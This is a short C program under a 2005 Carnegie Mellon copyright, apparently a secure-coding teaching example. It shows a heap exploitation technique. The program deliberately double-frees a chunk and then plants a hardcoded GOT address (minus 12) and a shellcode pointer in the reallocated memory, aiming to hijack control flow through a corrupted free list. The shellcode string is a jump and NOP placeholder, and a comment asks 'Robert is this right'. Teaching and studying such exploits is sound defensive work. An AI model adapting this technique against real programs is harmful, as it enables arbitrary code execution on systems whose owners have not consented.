/*
 *
 * Copyright (c) 2005 Carnegie Mellon University.
 * All rights reserved.
 * Permission to use this software and its documentation for any purpose is hereby granted,
 * provided that the above copyright notice appear and that both that copyright notice and
 * this permission notice appear in supporting documentation, and that the name of CMU not
 * be used in advertising or publicity pertaining to distribution of the software without
 * specific, written prior permission.
 *
 * CMU DISCLAIMS ALL WARRANTIES WITH REGARD TO THIS SOFTWARE, INCLUDING ALL IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS, IN NO EVENT SHALL CMU BE LIABLE FOR ANY SPECIAL, INDIRECT OR
 * CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS,
 * WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, RISING OUT OF OR IN
 * CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 */

#include <stdlib.h>
#include <string.h>
#include <stdio.h>

static char *GOT_LOCATION = (char *)0x0804c98c;
static char shellcode[] = "\xeb\x0cjump12chars_\x90\x90\x90\x90\x90\x90\x90\x90"; //Robert is this right

int main(void)
{
	int size = sizeof(shellcode);
	void *shellcode_location;
	void *first, *second, *third, *fourth;
	void *fifth, *sixth, *seventh;
	shellcode_location = (void *)malloc(size);
	strcpy(shellcode_location, shellcode);
	first = (void *)malloc(256);
	second = (void *)malloc(256);
	third = (void *)malloc(256);
	fourth = (void *)malloc(256);
	free(first);
	free(third);
	fifth = (void *)malloc(128);
	free(first);
	sixth = (void *)malloc(256);
	*((void **)(sixth+0))=(void *)(GOT_LOCATION-12);
	*((void **)(sixth+4))=(void *)shellcode_location;
	seventh = (void *)malloc(256);
	strcpy(fifth, "something");	
	return 0;
}

